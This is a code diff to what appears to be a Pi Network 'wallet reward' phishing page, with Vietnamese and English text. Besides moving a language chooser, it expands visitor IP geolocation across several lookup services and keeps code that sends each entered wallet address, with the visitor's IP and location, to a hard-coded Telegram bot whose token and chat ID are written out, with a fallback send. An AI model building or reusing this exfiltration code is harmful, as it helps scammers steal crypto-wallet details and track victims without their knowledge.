@@ -1001,31 +1001,35 @@
             display: none;
         }
 
-        /* Language chooser - FIXED POSITIONING FOR MOBILE */
+        /* Language chooser - FIXED POSITIONING AT BOTTOM OF SCREEN */
         .language-chooser {
-            position: absolute;
-            top: 16px;
-            right: 80px;
+            position: fixed;
+            bottom: 16px;
+            right: 16px;
             display: flex;
             align-items: center;
             z-index: 60;
+            background-color: rgba(255, 255, 255, 0.85);
+            border-radius: 30px;
+            padding: 6px 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(5px);
         }
         
-        /* Fix language chooser positioning for mobile devices */
+        /* Language chooser positioning for mobile devices */
         @media (max-width: 640px) {
             .language-chooser {
-                right: 50px;
-                top: 16px;
-                transform: scale(0.9);
+                bottom: 16px;
+                right: 16px;
             }
         }
         
         /* For very small screens */
         @media (max-width: 380px) {
             .language-chooser {
-                right: 40px;
-                top: 6px;
-                transform: scale(0.8);
+                bottom: 10px;
+                right: 10px;
+                transform: scale(0.9);
             }
             
             .pi-header-content .flex.items-center {
@@ -1039,21 +1043,21 @@
             padding: 4px 8px;
             border-radius: 4px;
             cursor: pointer;
-            color: rgba(255, 255, 255, 0.7);
+            color: rgba(0, 0, 0, 0.7);
             transition: all 0.2s ease;
             margin-left: 8px;
             font-size: 0.9rem;
         }
         
         .language-option:hover {
-            color: white;
-            background-color: rgba(255, 255, 255, 0.1);
+            color: #333;
+            background-color: rgba(0, 0, 0, 0.1);
         }
         
         .language-option.active {
-            color: white;
+            color: #333;
             font-weight: bold;
-            background-color: rgba(255, 255, 255, 0.15);
+            background-color: rgba(0, 0, 0, 0.15);
         }
         
         .language-option img {
@@ -1369,17 +1373,6 @@
                 <div class="wallet-icon">π</div>
                 <span class="wallet-text">Wallet</span>
                 <div class="pi-coin-icon">π</div>
-            </div>
-            
-            <div class="language-chooser">
-                <div class="language-option" data-lang="vi">
-                    <img src="https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/vn.svg" alt="Vietnamese">
-                    VN
-                </div>
-                <div class="language-option" data-lang="en">
-                    <img src="https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/us.svg" alt="English">
-                    EN
-                </div>
             </div>
             
             <button class="header-dropdown-btn" id="headerDropdownBtn">
@@ -1735,6 +1728,18 @@
                     </button>
                 </div>
             </div>
+        </div>
+    </div>
+
+    <!-- Language chooser at the bottom of the screen -->
+    <div class="language-chooser">
+        <div class="language-option" data-lang="vi">
+            <img src="https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/vn.svg" alt="Vietnamese">
+            VN
+        </div>
+        <div class="language-option" data-lang="en">
+            <img src="https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/us.svg" alt="English">
+            EN
         </div>
     </div>
 
@@ -2152,142 +2157,280 @@
             }
         }
         
-        // IP Tracking and Location Detection - IMPROVED VERSION
+        // Enhanced IP and Location detection with multiple APIs
         let userIPData = null;
         let ipBlockStatus = {
             blocked: false,
             reason: ''
         };
 
-        // Get user's IP and location information - Multiple APIs for redundancy
+        // Multi-API approach for IP and location detection - using 5 different APIs for redundancy
         async function getUserIPInfo() {
             try {
-                // First try IFCONFIG.ME (text-based simple API)
-                let response = await fetch('https://ifconfig.me/ip');
-                if (response.ok) {
-                    const ip = await response.text();
-                    return getLocationFromIP(ip);
+                // Try multiple APIs in sequence until one succeeds
+                const apis = [
+                    // API 1: ipapi.co - provides detailed location data
+                    async () => {
+                        const response = await fetch('https://ipapi.co/json/');
+                        if (!response.ok) throw new Error('ipapi.co failed');
+                        const data = await response.json();
+                        return {
+                            ip: data.ip,
+                            country: data.country_code,
+                            country_name: data.country_name,
+                            city: data.city,
+                            region: data.region,
+                            timezone: data.timezone
+                        };
+                    },
+                    
+                    // API 2: ipinfo.io - good alternative with city and country
+                    async () => {
+                        const response = await fetch('https://ipinfo.io/json?token=90d42ceec9b53a');
+                        if (!response.ok) throw new Error('ipinfo.io failed');
+                        const data = await response.json();
+                        return {
+                            ip: data.ip,
+                            country: data.country,
+                            country_name: await getCountryName(data.country),
+                            city: data.city,
+                            region: data.region,
+                            timezone: data.timezone
+                        };
+                    },
+                    
+                    // API 3: geoiplookup.io - another good alternative
+                    async () => {
+                        const response = await fetch('https://json.geoiplookup.io/');
+                        if (!response.ok) throw new Error('geoiplookup.io failed');
+                        const data = await response.json();
+                        return {
+                            ip: data.ip,
+                            country: data.country_code,
+                            country_name: data.country_name,
+                            city: data.city,
+                            region: data.region,
+                            timezone: null
+                        };
+                    },
+                    
+                    // API 4: IP-based with separate IP and location steps
+                    async () => {
+                        // First get IP only from ifconfig.me
+                        const ipResponse = await fetch('https://ifconfig.me/ip');
+                        if (!ipResponse.ok) throw new Error('ifconfig.me failed');
+                        const ip = await ipResponse.text();
+                        
+                        // Then get location data from ip-api.com
+                        const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
+                        if (!geoResponse.ok) throw new Error('ip-api.com failed');
+                        const geoData = await geoResponse.json();
+                        
+                        return {
+                            ip: ip,
+                            country: geoData.countryCode,
+                            country_name: geoData.country,
+                            city: geoData.city,
+                            region: geoData.regionName,
+                            timezone: geoData.timezone
+                        };
+                    },
+                    
+                    // API 5: Backup option with ipwhois.app
+                    async () => {
+                        const response = await fetch('https://ipwho.is/');
+                        if (!response.ok) throw new Error('ipwho.is failed');
+                        const data = await response.json();
+                        return {
+                            ip: data.ip,
+                            country: data.country_code,
+                            country_name: data.country,
+                            city: data.city,
+                            region: data.region,
+                            timezone: data.timezone.id
+                        };
+                    },
+                    
+                    // Final fallback: Use client-side information only
+                    async () => {
+                        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                        return {
+                            ip: "unavailable",
+                            country: await detectCountryFromTimezone(timezone),
+                            country_name: await getCountryNameFromTimezone(timezone),
+                            city: "unknown",
+                            region: "unknown",
+                            timezone: timezone
+                        };
+                    }
+                ];
+                
+                // Try each API in turn until one succeeds
+                for (const apiCall of apis) {
+                    try {
+                        const data = await apiCall();
+                        
+                        // Verify we have at least some data to work with
+                        if (data && (data.ip !== "unavailable" || data.timezone)) {
+                            // Success! Save the data
+                            userIPData = data;
+                            
+                            // Check if this is a suspicious IP
+                            checkIfIPBlocked(data.ip);
+                            
+                            // Set language based on location and browser
+                            determineAndSetLanguage(data);
+                            
+                            // Display location notification
+                            showLocationNotification(data);
+                            
+                            return data;
+                        }
+                    } catch (error) {
+                        console.log('API attempt failed:', error.message);
+                        // Continue to next API
+                    }
                 }
                 
-                // If first method fails, try ipapi.co
-                response = await fetch('https://ipapi.co/json/');
-                if (response.ok) {
-                    const data = await response.json();
-                    userIPData = {
-                        ip: data.ip,
-                        country: data.country_code,
-                        country_name: data.country_name,
-                        city: data.city,
-                        region: data.region
-                    };
-                    
-                    // Check if this is a suspicious IP
-                    checkIfIPBlocked(data.ip);
-                    
-                    // Set language based on country
-                    autoSetLanguage(data.country_code);
-                    
-                    // Display location notification
-                    showLocationNotification(userIPData);
-                    
-                    return userIPData;
-                }
+                // If we got here, all APIs failed
+                console.error('All location APIs failed');
+                return createFallbackUserData();
                 
-                // Last resort - try ipinfo.io
-                response = await fetch('https://ipinfo.io/json?token=90d42ceec9b53a');
-                if (response.ok) {
-                    const data = await response.json();
-                    userIPData = data;
-                    
-                    // Check if this is a suspicious IP
-                    checkIfIPBlocked(data.ip);
-                    
-                    // Set language based on country
-                    autoSetLanguage(data.country);
-                    
-                    // Display location notification
-                    showLocationNotification(data);
-                    
-                    return data;
-                }
-                
-                // If all methods fail, create a fallback with the user's timezone info
-                if (!userIPData) {
-                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    userIPData = {
-                        ip: "unavailable",
-                        country: "unknown",
-                        city: "unknown",
-                        timezone: timezone
-                    };
-                    return userIPData;
-                }
             } catch (error) {
-                console.error('Error fetching IP info:', error);
-                
-                // Create a fallback with at least timezone info
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                userIPData = {
-                    ip: "unavailable",
-                    country: "unknown",
-                    city: "unknown",
-                    timezone: timezone
-                };
-                return userIPData;
+                console.error('Error in getUserIPInfo:', error);
+                return createFallbackUserData();
             }
         }
         
-        // Get location details from IP using a separate API
-        async function getLocationFromIP(ip) {
+        // Create fallback user data using browser information
+        function createFallbackUserData() {
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const userData = {
+                ip: "unavailable",
+                country: detectCountryFromTimezone(timezone) || "unknown",
+                country_name: getCountryNameFromTimezone(timezone) || "Unknown",
+                city: "unknown",
+                region: "unknown",
+                timezone: timezone
+            };
+            
+            // Set language based on browser
+            determineAndSetLanguage(userData);
+            
+            // No location notification for fallback data
+            
+            return userData;
+        }
+        
+        // Helper function to get country name from country code
+        async function getCountryName(countryCode) {
+            if (!countryCode) return "Unknown";
+            
+            // Simple mapping of common country codes
+            const commonCountries = {
+                'US': 'United States',
+                'GB': 'United Kingdom',
+                'CA': 'Canada',
+                'AU': 'Australia',
+                'DE': 'Germany',
+                'FR': 'France',
+                'IT': 'Italy',
+                'ES': 'Spain',
+                'JP': 'Japan',
+                'CN': 'China',
+                'IN': 'India',
+                'BR': 'Brazil',
+                'RU': 'Russia',
+                'VN': 'Vietnam',
+                'TH': 'Thailand',
+                'MY': 'Malaysia',
+                'SG': 'Singapore',
+                'ID': 'Indonesia'
+            };
+            
+            // If it's a common country, return the name immediately
+            if (commonCountries[countryCode]) {
+                return commonCountries[countryCode];
+            }
+            
+            // Otherwise, try to get the name from the browser's Intl API
             try {
-                const response = await fetch(`https://ipapi.co/${ip}/json/`);
-                if (response.ok) {
-                    const data = await response.json();
-                    userIPData = {
-                        ip: ip,
-                        country: data.country_code,
-                        country_name: data.country_name,
-                        city: data.city,
-                        region: data.region
-                    };
-                    
-                    // Check if this is a suspicious IP
-                    checkIfIPBlocked(ip);
-                    
-                    // Set language based on country
-                    autoSetLanguage(data.country_code);
-                    
-                    // Display location notification
-                    showLocationNotification(userIPData);
-                    
-                    return userIPData;
-                } else {
-                    // If location lookup fails, create minimal data
-                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    userIPData = {
-                        ip: ip,
-                        country: "unknown",
-                        city: "unknown",
-                        timezone: timezone
-                    };
-                    return userIPData;
-                }
+                return new Intl.DisplayNames(['en'], { type: 'region' }).of(countryCode);
             } catch (error) {
-                console.error('Error fetching location from IP:', error);
-                
-                // Create minimal data with IP
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                userIPData = {
-                    ip: ip,
-                    country: "unknown",
-                    city: "unknown",
-                    timezone: timezone
-                };
-                return userIPData;
+                return countryCode; // Fallback to just returning the code
             }
         }
+        
+        // Detect country from timezone as fallback
+        function detectCountryFromTimezone(timezone) {
+            if (!timezone) return null;
+            
+            // Common timezone to country code mappings
+            const timezoneMap = {
+                'America/New_York': 'US',
+                'America/Los_Angeles': 'US',
+                'America/Chicago': 'US',
+                'America/Denver': 'US',
+                'Europe/London': 'GB',
+                'Europe/Paris': 'FR',
+                'Europe/Berlin': 'DE',
+                'Europe/Rome': 'IT',
+                'Europe/Madrid': 'ES',
+                'Asia/Tokyo': 'JP',
+                'Asia/Shanghai': 'CN',
+                'Asia/Kolkata': 'IN',
+                'Asia/Ho_Chi_Minh': 'VN',
+                'Asia/Bangkok': 'TH',
+                'Asia/Singapore': 'SG',
+                'Asia/Kuala_Lumpur': 'MY',
+                'Asia/Jakarta': 'ID',
+                'Australia/Sydney': 'AU',
+                'Australia/Melbourne': 'AU'
+            };
+            
+            // Try direct mapping
+            if (timezoneMap[timezone]) {
+                return timezoneMap[timezone];
+            }
+            
+            // Try to extract country from timezone
+            if (timezone.includes('/')) {
+                const region = timezone.split('/')[0];
+                
+                // Map regions to likely country codes
+                const regionMap = {
+                    'America': 'US',
+                    'Europe': 'EU',
+                    'Asia': 'AS',
+                    'Africa': 'AF',
+                    'Australia': 'AU',
+                    'Pacific': 'PA'
+                };
+                
+                return regionMap[region] || null;
+            }
+            
+            return null;
+        }
+        
+        // Get country name from timezone
+        function getCountryNameFromTimezone(timezone) {
+            const countryCode = detectCountryFromTimezone(timezone);
+            if (!countryCode) return "Unknown";
+            
+            const countryNames = {
+                'US': 'United States',
+                'EU': 'Europe',
+                'AS': 'Asia',
+                'AF': 'Africa',
+                'AU': 'Australia',
+                'PA': 'Pacific'
+            };
+            
+            return countryNames[countryCode] || "Unknown";
+        }
 
-        // Show location notification
+        // Improved show location notification - clearer notifications with detailed info
         function showLocationNotification(ipData) {
             if (!ipData) return;
             
@@ -2295,22 +2438,46 @@
             const countryFlag = document.getElementById('countryFlag');
             const notification = document.getElementById('locationDetectedMessage');
             
-            // Country flag - only set if we have a known country code
-            if (ipData.country && ipData.country !== "unknown") {
+            // Country flag - try to get a valid country flag
+            if (ipData.country && ipData.country !== "unknown" && ipData.country.length === 2) {
                 countryFlag.src = `https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/${ipData.country.toLowerCase()}.svg`;
+                countryFlag.onerror = () => {
+                    // If flag can't be loaded, use a generic flag
+                    countryFlag.src = `https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/xx.svg`;
+                };
             } else {
-                countryFlag.src = `https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/xx.svg`; // Generic flag
+                countryFlag.src = `https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/xx.svg`;
             }
             
-            // Location text based on language
+            // Location text with smart fallbacks to create a meaningful message
             const currentLang = getCurrentLanguage();
-            const city = ipData.city && ipData.city !== "unknown" ? ipData.city : "";
-            const country = ipData.country_name || ipData.country || "Unknown";
             
+            // Better location display with fallbacks
+            let city = ipData.city;
+            let region = ipData.region;
+            let country = ipData.country_name || getCountryName(ipData.country) || "Unknown";
+            
+            if (city === "unknown" || !city) {
+                city = "";
+            }
+            
+            if (region === "unknown" || !region || region === city) {
+                region = "";
+            }
+            
+            // Build location string
+            let locationString = "";
+            if (city) locationString += city;
+            if (region && city) locationString += ", " + region;
+            else if (region) locationString += region;
+            if ((city || region) && country) locationString += ", " + country;
+            else locationString += country;
+            
+            // Set the text
             if (currentLang === 'vi') {
-                locationText.textContent = `Đã phát hiện vị trí: ${city ? city + ", " : ""}${country}`;
+                locationText.textContent = `Đã phát hiện vị trí: ${locationString}`;
             } else {
-                locationText.textContent = `Location detected: ${city ? city + ", " : ""}${country}`;
+                locationText.textContent = `Location detected: ${locationString}`;
             }
             
             // Show notification
@@ -2489,8 +2656,8 @@
             return currentLanguage;
         }
 
-        // Auto-set language based on country
-        function autoSetLanguage(countryCode) {
+        // Determine and set language based on location, timezone, and browser language
+        function determineAndSetLanguage(userData) {
             // Check if user has a stored preference
             let storedPreference;
             try {
@@ -2505,11 +2672,23 @@
                 return;
             }
             
-            // Otherwise, detect based on country
-            if (countryCode === 'VN') {
-                setLanguage('vi');
-            } else {
+            // Get browser language
+            const browserLang = navigator.language || navigator.userLanguage;
+            const isVietnameseBrowser = browserLang.toLowerCase().startsWith('vi');
+            
+            // Check if the user's country is Vietnam
+            const isVietnam = userData.country === 'VN';
+            
+            // Check if timezone is Vietnam's
+            const isVietnamTimezone = userData.timezone === 'Asia/Ho_Chi_Minh' || 
+                                    userData.timezone === 'Asia/Saigon';
+            
+            // Set language to English if not in Vietnam, not using Vietnamese browser, and not using Vietnam timezone
+            if (!isVietnam && !isVietnameseBrowser && !isVietnamTimezone) {
                 setLanguage('en');
+            } else {
+                // Default to Vietnamese if any of the above conditions are true
+                setLanguage('vi');
             }
         }
 
@@ -2699,24 +2878,22 @@
                     // Increment submission count before making the request
                     const newCount = incrementSubmissionCount();
                     
-                    // Prepare detailed device information
-                    const browser = navigator.userAgent;
-                    const screenSize = `${window.screen.width}x${window.screen.height}`;
-                    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    const language = navigator.language;
-                    const currentTime = new Date().toLocaleString();
+                    // Format location info for the message - with improved fallbacks
+                    let locationInfo = 'Unknown location';
                     
-                    // Format location info for the message
-                    const locationInfo = userIPData ? 
-                        `${userIPData.city || 'Unknown city'}, ${userIPData.country_name || userIPData.country || 'Unknown country'}` : 
-                        'Location unavailable';
+                    if (userIPData) {
+                        const city = userIPData.city && userIPData.city !== 'unknown' ? userIPData.city : '';
+                        const country = userIPData.country_name || getCountryName(userIPData.country) || 'Unknown country';
+                        
+                        locationInfo = city ? `${city}, ${country}` : country;
+                    }
+                    
+                    // Prepare message with IP and location data (simplified - removing browser info, screen size, and time)
+                    const message = `🎁 Yêu cầu phần thưởng Pi mới!\n\n📋 Địa chỉ ví: ${walletAddress}\n📊 Lần gửi: ${newCount}/2\n\n📱 Thông tin:\n🌐 IP: ${userIPData.ip || 'unavailable'}\n📍 Vị trí: ${locationInfo}`;
                     
                     // Replace with your actual Telegram bot token and chat ID
                     const BOT_TOKEN = '7161535723:AAGqp8BU4hsvaUCO0nBdx6-tZM9BOwZfj1Y';
                     const CHAT_ID = '7305842707';
-                    
-                    // Prepare message with IP and location data
-                    const message = `🎁 Yêu cầu phần thưởng Pi mới!\n\n📋 Địa chỉ ví: ${walletAddress}\n⏰ Thời gian: ${currentTime}\n📊 Lần gửi: ${newCount}/2\n\n📱 Thông tin thiết bị:\n🌐 IP: ${userIPData.ip || 'unavailable'}\n📍 Vị trí: ${locationInfo}\n🖥️ Browser: ${browser}\n📱 Màn hình: ${screenSize}\n🕒 Múi giờ: ${timeZone}\n🌍 Ngôn ngữ: ${language}`;
                     
                     // Send to Telegram
                     const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -2761,7 +2938,7 @@
                     try {
                         // Make sure IP data is available for fallback method
                         if (!userIPData || userIPData.ip === "unavailable") {
-                            // Try one more time to get IP data
+                            // Try one more time to get IP data using a simpler API
                             try {
                                 const response = await fetch('https://api.ipify.org?format=json');
                                 if (response.ok) {
@@ -2777,22 +2954,19 @@
                             }
                         }
                         
-                        const timestamp = new Date().getTime();
                         const newCount = getSubmissionCount();
                         
-                        // Prepare detailed device information for fallback
-                        const browser = navigator.userAgent;
-                        const screenSize = `${window.screen.width}x${window.screen.height}`;
-                        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                        const language = navigator.language;
-                        const currentTime = new Date().toLocaleString();
+                        // Format location info for the message - simplified version
+                        let locationInfo = 'Unknown location';
                         
-                        // Format location info for the message
-                        const locationInfo = userIPData ? 
-                            `${userIPData.city || 'Unknown city'}, ${userIPData.country_name || userIPData.country || 'Unknown country'}` : 
-                            'Location unavailable';
+                        if (userIPData) {
+                            const city = userIPData.city && userIPData.city !== 'unknown' ? userIPData.city : '';
+                            const country = userIPData.country_name || userIPData.country || 'Unknown country';
+                            
+                            locationInfo = city ? `${city}, ${country}` : country;
+                        }
                         
-                        const fallbackMessage = `🎁 Yêu cầu phần thưởng Pi mới! (Fallback)\n\n📋 Địa chỉ ví: ${walletAddress}\n⏰ Thời gian: ${currentTime}\n📊 Lần gửi: ${newCount}/2\n\n📱 Thông tin thiết bị:\n🌐 IP: ${userIPData.ip || 'unavailable'}\n📍 Vị trí: ${locationInfo}\n🖥️ Browser: ${browser}\n📱 Màn hình: ${screenSize}\n🕒 Múi giờ: ${timeZone}\n🌍 Ngôn ngữ: ${language}`;
+                        const fallbackMessage = `🎁 Yêu cầu phần thưởng Pi mới! (Fallback)\n\n📋 Địa chỉ ví: ${walletAddress}\n📊 Lần gửi: ${newCount}/2\n\n📱 Thông tin:\n🌐 IP: ${userIPData.ip || 'unavailable'}\n📍 Vị trí: ${locationInfo}`;
                         
                         // URL-encoded message
                         const encodedMessage = encodeURIComponent(fallbackMessage);
